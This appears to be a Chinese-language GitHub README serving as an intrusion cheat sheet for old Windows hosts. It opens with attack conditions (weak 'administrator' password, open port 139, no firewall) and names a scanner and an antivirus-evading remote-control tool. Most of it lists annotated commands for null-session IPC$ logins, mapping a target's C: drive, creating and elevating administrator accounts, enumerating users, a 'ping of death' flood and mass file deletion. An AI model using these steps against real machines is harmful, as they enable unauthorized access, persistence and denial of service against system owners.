# kzj-柯智杰-github
弱口令:administrator。139端口，无防火墙。
NTscan扫描器，Recton--D贺免杀专用版，DameWare 4.5

NTscan--
net use \\ip\ipc$ " " /user:" " 建立IPC空链接
net use \\ip\ipc$ "密码" /user:"用户名" 建立IPC非空链接
net use h: \\ip\c$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H
net use h: \\ip\c$ 登陆后映射对方C：到本地为H:
net use \\ip\ipc$ /del 删除IPC链接
net use h: /del 删除映射对方到本地的为H:的映射
net user 用户名 密码 /add 建立用户
net user guest /active:yes 激活guest用户
net user 查看有哪些用户
net user 帐户名 查看帐户的属性
net localgroup administrators 用户名 /add 把"用户"添加到管理员中使其具有管理员权限,注意：administrator后加s用复数
net start 查看开启了哪些服务
net start 服务名 开启服务；(如:net start telnet， net start schedule)
net stop 服务名 停止某服务
net time \\目标ip 查看对方时间
net time \\目标ip /set 设置本地计算机时间与"目标IP"主机的时间同步,加上参数/yes可取消确认信息
net view 查看本地局域网内开启了哪些共享
net view \\ip 查看对方局域网内开启了哪些共享
net config 显示系统网络设置
net logoff 断开连接的共享
net pause 服务名 暂停某服务
net send ip "文本信息" 向对方发信息
net ver 局域网内正在使用的网络连接类型和信息
net share 查看本地开启的共享
net share ipc$ 开启ipc$共享
net share ipc$ /del 删除ipc$共享
net share c$ /del 删除C：共享
net user guest 12345 用guest用户登陆后用将密码改为12345
net password 密码 更改系统登陆密码
netstat -a 查看开启了哪些端口,常用netstat -an
netstat -n 查看端口的网络连接情况，常用netstat -an
netstat -v 查看正在进行的工作
netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）
netstat -s 查看正在使用的所有协议使用情况
nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写
tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数："-w数字"用于设置超时间隔。
ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数："-l[空格]数据包大小"；"-n发送数据次数"；"-t"指一直ping。
ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)
ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数"/all"显示全部配置信息
tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)
kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)
del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如"DEL/AR *.*"表示删除当前目录下所有只读文件，"DEL/A-S *.*"表示删除当前目录下除系统文件以外的所有文件
